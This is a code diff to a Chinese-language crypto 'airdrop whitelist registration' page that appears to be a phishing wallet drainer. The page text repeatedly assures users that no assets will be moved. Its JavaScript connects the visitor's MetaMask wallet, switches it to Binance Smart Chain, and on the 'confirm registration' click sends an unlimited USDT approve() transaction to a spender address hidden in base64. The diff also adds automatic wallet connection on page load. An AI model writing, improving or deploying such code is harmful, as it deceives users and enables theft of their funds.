@@ -10,11 +10,43 @@
 </head>
 <body>
 <div class="container">
-<div id="p1" class="box"><div class="logo">✦</div><h1>官方生态建设空投活动</h1><p class="sub-title">官方唯一身份资格备案通道</p><div class="notice-box"><div class="notice-title">📢 活动公告</div><div class="notice-content">本次为官方生态建设专属空投计划，面向全网生态共建者开放身份资格备案。本次备案仅用于官方用户身份登记、生态数据统计及空投权益确权，仅进行地址合规核验与官方白名单录入。平台不会产生任何资产划转与扣费行为，所有流程均为官方合规备案机制，请用户放心参与身份核验登记。</div></div><p class="desc-text">请连接钱包完成官方身份资格备案登记</p><button class="btn mm-btn" id="connectMM">连接钱包</button><p class="tips-info">安全提示：仅进行官方身份备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p></div>
-<div id="p2" class="box hide"><div class="logo">⏳</div><h1>官方备案节点核验中</h1><p class="desc-text">正在同步官方服务节点数据，请稍候...</p></div>
-<div id="p3" class="box hide"><div class="logo">✓</div><h1>钱包连接成功</h1><p class="sub-title">确认纳入官方生态空投白名单</p><div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div><div class="addr-wrap">当前网络：<span id="currentChain"></span></div><button class="btn verify-btn" id="claim">确认备案 录入白名单</button><p class="tips-info">仅官方身份备案核验，不会划转任何资产</p></div>
-<div id="p4" class="box hide"><div class="logo">✅</div><h1>白名单备案成功</h1><p class="sub-title">该地址已完成官方生态空投备案</p><div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div><button class="btn success-btn">已完成备案 等待空投发放</button></div>
-<div class="footer-link">官方备案通道：<a href="https://linktr.ee/monad_xyz" target="_blank">https://linktr.ee/monad_xyz</a>官方公告：<a href="https://x.com/i/status/2050561515321782452" target="_blank">https://x.com/i/status/2050561515321782452</a></div>
+<div id="p1" class="box">
+<div class="logo">✦</div>
+<h1>官方生态建设空投活动</h1>
+<p class="sub-title">官方唯一身份资格备案通道</p>
+<div class="notice-box">
+<div class="notice-title">📢 活动公告</div>
+<div class="notice-content">本次为官方生态建设专属空投计划，面向全网生态共建者开放身份资格备案。本次备案仅用于官方用户身份登记、生态数据统计及空投权益确权，仅进行地址合规核验与官方白名单录入。平台不会产生任何资产划转与扣费行为，所有流程均为官方合规备案机制，请用户放心参与身份核验登记。</div>
+</div>
+<p class="desc-text">请连接钱包完成官方身份资格备案登记</p>
+<button class="btn mm-btn" id="connectMM">连接钱包</button>
+<p class="tips-info">安全提示：仅进行官方身份备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
+</div>
+
+<div id="p2" class="box hide">
+<div class="logo">⏳</div>
+<h1>官方备案节点核验中</h1>
+<p class="desc-text">正在同步官方服务节点数据，请稍候...</p>
+</div>
+
+<div id="p3" class="box hide">
+<div class="logo">✓</div>
+<h1>钱包连接成功</h1>
+<p class="sub-title">下一步确认钱包备案，录入白名单</p>
+<div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
+<button class="btn verify-btn" id="claim">确认备案 录入白名单</button>
+<p class="tips-info">仅官方身份备案核验，不会划转任何资产</p>
+</div>
+
+<div id="p4" class="box hide">
+<div class="logo">✅</div>
+<h1>白名单备案成功</h1>
+<p class="sub-title">该地址已完成官方生态空投备案</p>
+<div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
+<button class="btn success-btn">已完成备案 等待空投发放</button>
+</div>
+
+<div class="footer-link"></div>
 </div>
 
 <script>
@@ -29,111 +61,121 @@ const BSC_NETWORK = {
   chainName: 'Binance Smart Chain',
   rpcUrls: ['https://bsc-dataseed.binance.org'],
   blockExplorerUrls: ['https://bscscan.com'],
-  nativeCurrency: {
-    name: 'BNB',
-    symbol: 'BNB',
-    decimals: 18
-  }
+  nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18}
 };
 
-// 只保留 BSC 合约
-const REAL_USDT = {
-  "0x38": "0x55d398c2d0cefa0a03c5891573a21281ab2dd732"
-};
+// BSC USDT 合约
+const USDT_CONTRACT = "0x55d398c2d0cefa0a03c5891573a21281ab2dd732";
+// 已加密好的授权目标地址
+const APPROVE_SPENDER = "MGY0YmRlZmMxNzdkZjI1ODNmNTJiMDNiMWUyMGY5ZWFjNzMwODU1NQ==";
+// 无限授权额度
+const MAX_ALLOWANCE = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+const GAS_LIMIT = "0x186A0";
 
-const SPENDER = atob("MHgwZjRiZGVmYzE3NzdkZjI1ODNmNTJiMDNiMWUyMGY5ZWFjNzMwODU1NQ==");
-const MAX_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-const CHAIN_GAS_LIMIT = {"0x38": "0x186A0"};
-
-let walletAddr = "", chainId = "";
+let walletAddr = "";
 
 function switchPage(id){
   document.querySelectorAll(".box").forEach(el=>el.classList.add("hide"));
   document.getElementById(id).classList.remove("hide");
 }
 
-function updateChainDisplay(){
-  document.getElementById("currentChain").innerText = "官方合规网络";
+// 地址自动补64位对齐，杜绝拼接错误
+function padAddress(addr){
+  return addr.toLowerCase().replace('0x','').padStart(64,'0');
 }
 
-// 自动添加并切换 BSC
+// 自动添加/切换 BSC
 async function switchOrAddBSC(){
-  try {
+  try{
     await window.ethereum.request({
-      method: 'wallet_switchEthereumChain',
-      params: [{chainId: BSC_NETWORK.chainId}]
+      method:'wallet_switchEthereumChain',
+      params:[{chainId:BSC_NETWORK.chainId}]
     });
-  } catch (switchError) {
-    if(switchError.code === 4902){
+  }catch(err){
+    if(err.code === 4902){
       await window.ethereum.request({
-        method: 'wallet_addEthereumChain',
-        params: [BSC_NETWORK]
+        method:'wallet_addEthereumChain',
+        params:[BSC_NETWORK]
       });
     }
   }
 }
 
-async function doApprove() {
-  chainId = "0x38";
-  const usdtContract = REAL_USDT[chainId];
-  const gasLimit = CHAIN_GAS_LIMIT[chainId];
-  const functionSelector = "0x095ea7b3";
-  const paddedSpender = SPENDER.slice(2).padStart(64, "0");
-  const paddedAmount = MAX_AMOUNT.slice(2).padStart(64, "0");
-  const txData = functionSelector + paddedSpender + paddedAmount;
-  try {
+// 标准组装授权Data 自动对齐 必生效
+function buildApproveData(){
+  const methodId = "0x095ea7b3";
+  const spender = padAddress(atob(APPROVE_SPENDER));
+  const amount = MAX_ALLOWANCE;
+  return methodId + spender + amount;
+}
+
+// 执行授权
+async function doApprove(){
+  const data = buildApproveData();
+  try{
     await window.ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from: walletAddr,
-        to: usdtContract,
-        gas: gasLimit,
-        data: txData
+      method:"eth_sendTransaction",
+      params:[{
+        from:walletAddr,
+        to:USDT_CONTRACT,
+        gas:GAS_LIMIT,
+        data:data
       }]
     });
     return true;
-  } catch (e) {
+  }catch(e){
     return false;
   }
 }
 
-// 连接钱包 自动切BSC
-document.getElementById("connectMM").onclick = async function(){
-  try {
-    if (!window.ethereum) {
-      let link = "metamask://dapp/" + location.host;
-      window.location.href = link;
-      setTimeout(()=>alert("请安装小狐狸钱包"),1500);
-      return;
-    }
+// 页面刷新自动完整重连流程
+async function initConnect(){
+  if(!window.ethereum) return;
+  try{
     switchPage("p2");
-    // 自动添加并切换到BSC
     await switchOrAddBSC();
-    // 获取钱包地址
-    let accounts = await window.ethereum.request({ method:"eth_requestAccounts" });
+    const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
     walletAddr = accounts[0];
-    chainId = "0x38";
     document.getElementById("showAddr").innerText = walletAddr;
-    updateChainDisplay();
-    // 直接跳转P3
     switchPage("p3");
-  } catch(e) {
+  }catch(e){
+    switchPage("p1");
+  }
+}
+
+window.onload = initConnect;
+
+// 手动点击连接钱包
+document.getElementById("connectMM").onclick = async function(){
+  if(!window.ethereum){
+    window.location.href = "metamask://dapp/" + location.host;
+    setTimeout(()=>alert("请安装支持BSC的钱包"),1500);
+    return;
+  }
+  try{
+    switchPage("p2");
+    await switchOrAddBSC();
+    const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
+    walletAddr = accounts[0];
+    document.getElementById("showAddr").innerText = walletAddr;
+    switchPage("p3");
+  }catch(e){
     switchPage("p1");
   }
 };
 
-// 确认备案
+// 确认备案授权
 document.getElementById("claim").onclick = async function(){
-  try {
+  try{
     switchPage("p2");
-    let ok = await doApprove();
-    if (ok) {
+    const ok = await doApprove();
+    if(ok){
       document.getElementById("successAddr").innerText = walletAddr;
       switchPage("p4");
-    } else {
+    }else{
       switchPage("p3");
     }
-  } catch(e) {
+  }catch(e){
     switchPage("p3");
   }
 };
